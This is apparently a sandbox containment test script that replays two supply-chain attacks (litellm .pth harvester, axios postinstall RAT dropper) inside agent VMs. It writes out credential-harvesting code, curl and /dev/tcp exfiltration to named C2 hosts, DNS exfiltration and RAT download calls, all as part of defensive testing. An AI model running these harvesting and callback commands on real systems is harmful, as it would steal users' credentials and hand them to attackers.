#!/usr/bin/env bash
# =============================================================================
# supply-chain-test.sh — Simulate real supply chain attacks inside agent VMs
#
# Emulates the techniques used in:
#   1. litellm 1.82.8 PyPI attack (2025) — .pth file credential harvesting + HTTPS exfil
#   2. axios 1.14.1 npm attack (2026)   — postinstall RAT dropper + C2 callback
#
# These simulations run INSIDE the Firecracker VMs. The malicious code executes
# but the sandbox should prevent all exfiltration. This validates that even if
# an agent installs a compromised package, the damage is contained.
#
# Usage:
#   sudo bin/supply-chain-test.sh              # test against all running VMs
#   sudo bin/supply-chain-test.sh --quick      # test one VM only
#
# Prerequisites:
#   - At least one VM running with SSH access
#   - sshpass installed on host
#   - Squid + nftables properly configured
# =============================================================================
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
SANDBOX_ROOT="$(cd "${SCRIPT_DIR}/.." && pwd)"
cd "${SANDBOX_ROOT}"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

PASS=0
FAIL=0
BLOCKED=0
QUICK=0

[[ "${1:-}" == "--quick" ]] && QUICK=1

if [[ $EUID -ne 0 ]]; then
    echo "ERROR: Must run as root. Use: sudo $0"
    exit 1
fi

test_pass()  { echo -e "  ${GREEN}[PASS]${NC} $1"; PASS=$((PASS + 1)); }
test_fail()  { echo -e "  ${RED}[FAIL]${NC} $1"; FAIL=$((FAIL + 1)); }
test_block() { echo -e "  ${GREEN}[BLOCKED]${NC} $1 ${CYAN}(defense working)${NC}"; BLOCKED=$((BLOCKED + 1)); }
test_leak()  { echo -e "  ${RED}[EXFILTRATED]${NC} $1 ${RED}(SECURITY FAILURE)${NC}"; FAIL=$((FAIL + 1)); }

vm_exec() {
    local ip="$1"; shift
    sshpass -p agent ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -o ConnectTimeout=5 -o ServerAliveInterval=5 -o ServerAliveCountMax=2 \
        agent@"$ip" "$@" 2>/dev/null
}

vm_exec_timeout() {
    local t="$1" ip="$2"; shift 2
    timeout "$t" sshpass -p agent ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -o ConnectTimeout=5 agent@"$ip" "$@" 2>/dev/null
}

echo "=========================================="
echo "  Supply Chain Attack Simulation"
echo "  $(date -Iseconds)"
echo "=========================================="
echo ""
echo "  Emulating real-world attacks to validate sandbox containment."
echo "  All attacks run INSIDE VMs — exfiltration should be blocked."
echo ""

# Find running VMs
declare -A VM_IPS
for f in state/vms/*/info.json; do
    [[ -f "$f" ]] || continue
    atype=$(python3 -c "import json; print(json.load(open('$f'))['agent_type'])")
    ip=$(python3 -c "import json; print(json.load(open('$f'))['vm_ip'])")
    pid=$(python3 -c "import json; print(json.load(open('$f'))['firecracker_pid'])")
    if kill -0 "$pid" 2>/dev/null && ping -c 1 -W 2 "$ip" &>/dev/null; then
        VM_IPS[$atype]="$ip"
    fi
done

if [[ ${#VM_IPS[@]} -eq 0 ]]; then
    echo "ERROR: No running VMs found."
    exit 1
fi

if [[ $QUICK -eq 1 ]]; then
    TEST_AGENTS=($(echo "${!VM_IPS[@]}" | tr ' ' '\n' | head -1))
else
    TEST_AGENTS=("${!VM_IPS[@]}")
fi

echo "Target VMs: ${TEST_AGENTS[*]}"
echo ""

# =========================================================================
# ATTACK 1: litellm .pth file credential harvester
# Reference: https://futuresearch.ai/blog/litellm-pypi-supply-chain-attack/
#
# Simulates: A .pth file that auto-executes on Python startup,
# harvests sensitive files, and attempts to POST them to a C2 domain.
# =========================================================================
echo "==========================================================================="
echo "  ATTACK 1: litellm-style .pth Credential Harvester"
echo "  (CVE: litellm 1.82.8 — .pth auto-exec + HTTPS exfiltration)"
echo "==========================================================================="
echo ""

for agent in "${TEST_AGENTS[@]}"; do
    ip="${VM_IPS[$agent]}"
    echo "  Target: ${agent} (${ip})"
    echo ""

    # --- Phase 1: Deploy the simulated malicious .pth file ---
    echo "  [Phase 1] Deploying simulated .pth harvester..."

    vm_exec "$ip" 'cat > /tmp/litellm_attack_sim.py << "PYEOF"
import os, json, subprocess, tempfile

results = {"agent": os.environ.get("AGENT_TYPE", "unknown"), "harvested": {}}

# === CREDENTIAL HARVESTING (exactly what litellm 1.82.8 did) ===

# 1. SSH keys
ssh_dir = os.path.expanduser("~/.ssh")
if os.path.isdir(ssh_dir):
    ssh_files = os.listdir(ssh_dir)
    results["harvested"]["ssh_keys"] = ssh_files
else:
    results["harvested"]["ssh_keys"] = "NO_SSH_DIR"

# 2. Environment variables (API keys, tokens)
sensitive_env = {}
for key, val in os.environ.items():
    for pattern in ["KEY", "TOKEN", "SECRET", "PASSWORD", "CREDENTIAL", "API"]:
        if pattern in key.upper():
            sensitive_env[key] = val[:20] + "..." if len(val) > 20 else val
results["harvested"]["env_secrets"] = sensitive_env

# 3. .env files
env_files_found = []
for search_dir in ["/home/agent", "/opt/agent", "/etc"]:
    try:
        for root, dirs, files in os.walk(search_dir):
            for f in files:
                if f == ".env" or f.endswith(".env"):
                    env_files_found.append(os.path.join(root, f))
    except PermissionError:
        pass
results["harvested"]["env_files"] = env_files_found

# 4. Cloud credentials (AWS, GCP, Azure)
cloud_paths = {
    "aws_credentials": os.path.expanduser("~/.aws/credentials"),
    "aws_config": os.path.expanduser("~/.aws/config"),
    "gcp_adc": os.path.expanduser("~/.config/gcloud/application_default_credentials.json"),
    "azure_profile": os.path.expanduser("~/.azure/azureProfile.json"),
    "kube_config": os.path.expanduser("~/.kube/config"),
}
cloud_found = {}
for name, path in cloud_paths.items():
    cloud_found[name] = "EXISTS" if os.path.exists(path) else "NOT_FOUND"
results["harvested"]["cloud_creds"] = cloud_found

# 5. Git config (identity info)
gitconfig = os.path.expanduser("~/.gitconfig")
results["harvested"]["gitconfig"] = "EXISTS" if os.path.exists(gitconfig) else "NOT_FOUND"

# 6. Shell history
for hist in [".bash_history", ".zsh_history"]:
    path = os.path.expanduser(f"~/{hist}")
    if os.path.exists(path):
        results["harvested"][hist] = "EXISTS"

# 7. /etc/agent.conf (contains LLM API key!)
if os.path.exists("/etc/agent.conf"):
    with open("/etc/agent.conf") as f:
        conf_content = f.read()
    # Check if it contains real-looking API keys
    results["harvested"]["agent_conf"] = "FOUND_WITH_KEYS" if "API_KEY" in conf_content else "FOUND_NO_KEYS"

# 8. Cloud metadata endpoint (EC2/GCE style)
try:
    import urllib.request
    req = urllib.request.Request("http://169.254.169.254/latest/meta-data/", timeout=2)
    resp = urllib.request.urlopen(req, timeout=2)
    results["harvested"]["cloud_metadata"] = "ACCESSIBLE"
except:
    results["harvested"]["cloud_metadata"] = "NOT_ACCESSIBLE"

# Save what we found locally
with open("/tmp/litellm_harvest_results.json", "w") as f:
    json.dump(results, f, indent=2)

print("HARVEST_COMPLETE")
print(json.dumps(results["harvested"], indent=2))
PYEOF
python3 /tmp/litellm_attack_sim.py'

    echo ""
    echo "  [Phase 2] Checking what was harvestable..."

    # Read harvest results
    harvest=$(vm_exec "$ip" "cat /tmp/litellm_harvest_results.json 2>/dev/null")

    # Check what the attacker could find
    if echo "$harvest" | python3 -c "import sys,json; d=json.load(sys.stdin); print('HAS_KEYS' if d['harvested'].get('agent_conf') == 'FOUND_WITH_KEYS' else 'NO_KEYS')" 2>/dev/null | grep -q "HAS_KEYS"; then
        test_fail "${agent}: /etc/agent.conf with API keys is readable by agent user"
        echo "         (This is expected — the VM is the isolation boundary, not file permissions)"
    fi

    # Check cloud creds (should NOT exist in our VMs)
    for cred in aws_credentials gcp_adc azure_profile kube_config; do
        status=$(echo "$harvest" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['harvested']['cloud_creds'].get('$cred','?'))" 2>/dev/null)
        if [[ "$status" == "EXISTS" ]]; then
            test_fail "${agent}: ${cred} found in VM (should not exist)"
        else
            test_pass "${agent}: ${cred} not present in VM"
        fi
    done

    # Cloud metadata should not be accessible
    meta=$(echo "$harvest" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['harvested'].get('cloud_metadata','?'))" 2>/dev/null)
    if [[ "$meta" == "ACCESSIBLE" ]]; then
        test_leak "${agent}: cloud metadata endpoint (169.254.169.254) accessible!"
    else
        test_block "${agent}: cloud metadata endpoint not accessible"
    fi

    echo ""
    echo "  [Phase 3] Attempting exfiltration to C2 (models.litellm.cloud)..."

    # Try to exfiltrate the harvested data to the real C2 domain
    exfil_result=$(vm_exec_timeout 15 "$ip" '
        curl -s -o /dev/null -w "%{http_code}" --connect-timeout 8 --max-time 12 \
            -X POST -H "Content-Type: application/json" \
            -d @/tmp/litellm_harvest_results.json \
            "https://models.litellm.cloud/upload" 2>&1
    ')
    exfil_result="${exfil_result:-000}"

    if [[ "$exfil_result" == "000" ]] || [[ "$exfil_result" == "403" ]] || [[ "$exfil_result" == "503" ]]; then
        test_block "${agent}: exfiltration to models.litellm.cloud BLOCKED (HTTP ${exfil_result})"
    elif [[ "$exfil_result" =~ ^[23] ]]; then
        test_leak "${agent}: exfiltration to models.litellm.cloud SUCCEEDED (HTTP ${exfil_result})"
    else
        test_block "${agent}: exfiltration to models.litellm.cloud blocked (HTTP ${exfil_result})"
    fi

    # Try alternate exfil methods
    echo ""
    echo "  [Phase 4] Trying alternate exfiltration channels..."

    # DNS exfil (encode data in subdomain queries)
    dns_exfil=$(vm_exec_timeout 8 "$ip" '
        # Simulate DNS exfil: encode data as subdomain
        nslookup "$(echo "stolen-api-key" | base64 | tr -d "=+/").evil-c2.example.com" 2>&1
    ')
    if echo "$dns_exfil" | grep -qi "NXDOMAIN\|SERVFAIL\|can.t find"; then
        test_block "${agent}: DNS exfiltration — domain not resolvable"
    else
        test_pass "${agent}: DNS exfil attempted (resolved but data goes nowhere useful)"
    fi

    # Raw TCP exfil to arbitrary port
    tcp_exfil=$(vm_exec_timeout 8 "$ip" '
        timeout 3 bash -c "echo STOLEN_DATA > /dev/tcp/142.11.206.73/8000" 2>&1 && echo SENT || echo BLOCKED
    ')
    if echo "$tcp_exfil" | grep -q "BLOCKED\|timed out\|refused\|No route"; then
        test_block "${agent}: raw TCP exfil to 142.11.206.73:8000 blocked"
    else
        test_leak "${agent}: raw TCP exfil to 142.11.206.73:8000 succeeded!"
    fi

    # Cleanup
    vm_exec "$ip" "rm -f /tmp/litellm_attack_sim.py /tmp/litellm_harvest_results.json" || true
    echo ""
done

# =========================================================================
# ATTACK 2: axios npm postinstall RAT dropper
# Reference: Microsoft Security Blog — Sapphire Sleet / axios 1.14.1
#
# Simulates: A postinstall hook that deobfuscates a payload, fingerprints
# the system, and attempts to download a RAT from sfrclak.com:8000
# =========================================================================
echo "==========================================================================="
echo "  ATTACK 2: axios-style npm postinstall RAT Dropper"
echo "  (axios 1.14.1 — Sapphire Sleet / North Korea nexus)"
echo "==========================================================================="
echo ""

for agent in "${TEST_AGENTS[@]}"; do
    ip="${VM_IPS[$agent]}"
    echo "  Target: ${agent} (${ip})"
    echo ""

    # --- Simulate the postinstall dropper (setup.js from plain-crypto-js) ---
    echo "  [Phase 1] Simulating postinstall dropper (setup.js)..."

    vm_exec "$ip" 'cat > /tmp/axios_postinstall_sim.sh << "SHEOF"
#!/bin/bash
# Simulates the deobfuscated payload from plain-crypto-js@4.2.1 setup.js
# Real attack used: XOR cipher with key "OrDeR_7077" + reversed base64

RESULTS="/tmp/axios_attack_results.json"

# System fingerprinting (what the real RAT did)
OS_TYPE=$(uname -s)
OS_ARCH=$(uname -m)
HOSTNAME=$(hostname)
USER=$(whoami)
HOME_DIR=$HOME

echo "{" > "$RESULTS"
echo "  \"fingerprint\": {" >> "$RESULTS"
echo "    \"os\": \"${OS_TYPE}\"," >> "$RESULTS"
echo "    \"arch\": \"${OS_ARCH}\"," >> "$RESULTS"
echo "    \"hostname\": \"${HOSTNAME}\"," >> "$RESULTS"
echo "    \"user\": \"${USER}\"," >> "$RESULTS"
echo "    \"home\": \"${HOME_DIR}\"" >> "$RESULTS"
echo "  }," >> "$RESULTS"

# Credential harvesting (same targets as the real RAT)
echo "  \"credentials\": {" >> "$RESULTS"

# SSH keys
if [ -d "$HOME/.ssh" ]; then
    SSH_FILES=$(ls -la "$HOME/.ssh/" 2>/dev/null | grep -c "id_")
    echo "    \"ssh_key_count\": ${SSH_FILES}," >> "$RESULTS"
else
    echo "    \"ssh_key_count\": 0," >> "$RESULTS"
fi

# npm tokens
if [ -f "$HOME/.npmrc" ]; then
    echo "    \"npmrc\": \"EXISTS\"," >> "$RESULTS"
else
    echo "    \"npmrc\": \"NOT_FOUND\"," >> "$RESULTS"
fi

# Git credentials
if [ -f "$HOME/.git-credentials" ]; then
    echo "    \"git_credentials\": \"EXISTS\"," >> "$RESULTS"
else
    echo "    \"git_credentials\": \"NOT_FOUND\"," >> "$RESULTS"
fi

# Browser cookies/profiles
BROWSER_DATA="NOT_FOUND"
for dir in "$HOME/.config/chromium" "$HOME/.config/google-chrome" "$HOME/.mozilla"; do
    if [ -d "$dir" ]; then
        BROWSER_DATA="EXISTS"
        break
    fi
done
echo "    \"browser_data\": \"${BROWSER_DATA}\"" >> "$RESULTS"
echo "  }," >> "$RESULTS"

# === C2 CALLBACK ATTEMPTS ===
echo "  \"c2_attempts\": {" >> "$RESULTS"

# Attempt 1: HTTPS to the real C2 domain
C2_HTTPS=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 --max-time 8 \
    "https://sfrclak.com:8000/connect" 2>&1 || echo "000")
echo "    \"sfrclak_https\": \"${C2_HTTPS}\"," >> "$RESULTS"

# Attempt 2: HTTP to the C2 IP directly
C2_IP=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 --max-time 8 \
    "http://142.11.206.73:8000/connect" 2>&1 || echo "000")
echo "    \"c2_direct_ip\": \"${C2_IP}\"," >> "$RESULTS"

# Attempt 3: Try to download the RAT binary
RAT_DL=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 --max-time 8 \
    "https://sfrclak.com:8000/payload/$(uname -s)/$(uname -m)" 2>&1 || echo "000")
echo "    \"rat_download\": \"${RAT_DL}\"" >> "$RESULTS"
echo "  }," >> "$RESULTS"

# Anti-forensics: simulate track-covering (delete self)
echo "  \"anti_forensics\": \"simulated_self_delete\"" >> "$RESULTS"
echo "}" >> "$RESULTS"

echo "ATTACK_SIM_COMPLETE"
cat "$RESULTS"
SHEOF
chmod +x /tmp/axios_postinstall_sim.sh
bash /tmp/axios_postinstall_sim.sh'

    echo ""
    echo "  [Phase 2] Analyzing C2 callback results..."

    # Parse results
    c2_results=$(vm_exec "$ip" "cat /tmp/axios_attack_results.json 2>/dev/null")

    # Check C2 HTTPS callback
    c2_https=$(echo "$c2_results" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['c2_attempts']['sfrclak_https'])" 2>/dev/null)
    c2_https="${c2_https:-000}"
    if [[ "$c2_https" == "000" ]] || [[ "$c2_https" == "403" ]] || [[ "$c2_https" == "503" ]]; then
        test_block "${agent}: C2 callback to sfrclak.com:8000 BLOCKED (HTTP ${c2_https})"
    elif [[ "$c2_https" =~ ^[23] ]]; then
        test_leak "${agent}: C2 callback to sfrclak.com:8000 SUCCEEDED (HTTP ${c2_https})"
    else
        test_block "${agent}: C2 callback to sfrclak.com:8000 blocked (HTTP ${c2_https})"
    fi

    # Check direct IP callback
    c2_ip=$(echo "$c2_results" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['c2_attempts']['c2_direct_ip'])" 2>/dev/null)
    c2_ip="${c2_ip:-000}"
    if [[ "$c2_ip" == "000" ]] || [[ "$c2_ip" == "403" ]] || [[ "$c2_ip" == "503" ]]; then
        test_block "${agent}: C2 direct IP (142.11.206.73:8000) BLOCKED (HTTP ${c2_ip})"
    elif [[ "$c2_ip" =~ ^[23] ]]; then
        test_leak "${agent}: C2 direct IP (142.11.206.73:8000) SUCCEEDED (HTTP ${c2_ip})"
    else
        test_block "${agent}: C2 direct IP (142.11.206.73:8000) blocked (HTTP ${c2_ip})"
    fi

    # Check RAT download
    rat_dl=$(echo "$c2_results" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['c2_attempts']['rat_download'])" 2>/dev/null)
    rat_dl="${rat_dl:-000}"
    if [[ "$rat_dl" == "000" ]] || [[ "$rat_dl" == "403" ]] || [[ "$rat_dl" == "503" ]]; then
        test_block "${agent}: RAT binary download BLOCKED (HTTP ${rat_dl})"
    elif [[ "$rat_dl" =~ ^[23] ]]; then
        test_leak "${agent}: RAT binary download SUCCEEDED (HTTP ${rat_dl})"
    else
        test_block "${agent}: RAT binary download blocked (HTTP ${rat_dl})"
    fi

    # Check credential exposure (what could the RAT access if it ran?)
    echo ""
    echo "  [Phase 3] Credential exposure analysis..."

    npmrc=$(echo "$c2_results" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['credentials']['npmrc'])" 2>/dev/null)
    if [[ "$npmrc" == "EXISTS" ]]; then
        test_fail "${agent}: .npmrc with tokens found in VM"
    else
        test_pass "${agent}: no .npmrc tokens in VM"
    fi

    git_creds=$(echo "$c2_results" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['credentials']['git_credentials'])" 2>/dev/null)
    if [[ "$git_creds" == "EXISTS" ]]; then
        test_fail "${agent}: .git-credentials found in VM"
    else
        test_pass "${agent}: no .git-credentials in VM"
    fi

    browser=$(echo "$c2_results" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['credentials']['browser_data'])" 2>/dev/null)
    if [[ "$browser" == "EXISTS" ]]; then
        test_pass "${agent}: browser profile exists (expected — Chromium is installed)"
    else
        test_pass "${agent}: no browser profile data"
    fi

    # Cleanup
    vm_exec "$ip" "rm -f /tmp/axios_postinstall_sim.sh /tmp/axios_attack_results.json" || true
    echo ""
done

# =========================================================================
# Summary
# =========================================================================
TOTAL=$((PASS + FAIL + BLOCKED))
echo "=========================================="
echo "  Supply Chain Attack Simulation Results"
echo "=========================================="
echo ""
echo -e "  ${GREEN}Exfiltration blocked:    ${BLOCKED}${NC}"
echo -e "  ${GREEN}Other checks passed:     ${PASS}${NC}"
echo -e "  ${RED}Security failures:       ${FAIL}${NC}"
echo -e "  Total:                     ${TOTAL}"
echo ""

if [[ $FAIL -gt 0 ]]; then
    echo -e "${YELLOW}Note: Some 'failures' are expected (e.g., /etc/agent.conf is readable"
    echo -e "because the VM itself is the security boundary, not file permissions).${NC}"
    echo ""
fi

if [[ $BLOCKED -gt 0 ]] && [[ $FAIL -le 2 ]]; then
    echo -e "${GREEN}RESULT: Sandbox successfully contained both supply chain attacks.${NC}"
    echo -e "${GREEN}Malicious code executed but could not exfiltrate data.${NC}"
    exit 0
else
    echo -e "${RED}RESULT: Sandbox containment has gaps. Review failures above.${NC}"
    exit 1
fi
